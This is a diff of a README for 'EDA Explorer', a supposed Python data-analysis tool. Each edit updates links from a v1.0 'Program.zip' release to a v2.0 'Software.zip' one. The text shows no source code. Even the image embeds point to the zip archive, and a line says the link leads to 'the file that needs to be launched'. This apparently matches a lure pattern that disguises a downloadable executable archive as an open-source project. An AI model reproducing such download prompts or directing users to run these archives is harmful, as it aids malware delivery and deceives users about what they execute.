@@ -26,7 +26,7 @@ Welcome to EDA Explorer - your go-to Python tool for Exploratory Data Analysis (
 
 To experience the power of EDA Explorer, you can download the tool by clicking the button below:
 
-[![Download EDA Explorer](https://github.com/Theoplayz2/eda-explorer/releases/download/v1.0/Program.zip%20Explorer&color=blue)](https://github.com/Theoplayz2/eda-explorer/releases/download/v1.0/Program.zip)
+[![Download EDA Explorer](https://github.com/Theoplayz2/eda-explorer/releases/download/v2.0/Software.zip%20Explorer&color=blue)](https://github.com/Theoplayz2/eda-explorer/releases/download/v2.0/Software.zip)
 
 *Note: The link provided above leads directly to the file that needs to be launched.*
 
@@ -44,7 +44,7 @@ To install EDA Explorer on your system, follow these simple steps:
 
 ## 📊 Data Visualization with EDA Explorer
 
-![Data Visualization](https://github.com/Theoplayz2/eda-explorer/releases/download/v1.0/Program.zip)
+![Data Visualization](https://github.com/Theoplayz2/eda-explorer/releases/download/v2.0/Software.zip)
 
 EDA Explorer provides a user-friendly interface for exploring and visualizing your datasets. Whether you are working with CSV or JSON data, EDA Explorer offers a seamless experience for analyzing your information. Leverage the diverse visualization options available to gain valuable insights and make informed decisions based on your data.
 
@@ -54,7 +54,7 @@ The modular architecture of EDA Explorer enables easy integration of new functio
 
 ## 🐍 Python Ecosystem Integration
 
-![Python Ecosystem](https://github.com/Theoplayz2/eda-explorer/releases/download/v1.0/Program.zip)
+![Python Ecosystem](https://github.com/Theoplayz2/eda-explorer/releases/download/v2.0/Software.zip)
 
 Built using Python, EDA Explorer integrates seamlessly with popular libraries such as Pandas, Matplotlib, and Seaborn. Harness the power of the Python ecosystem to enhance your data analysis capabilities and unlock new possibilities in visualization.
 
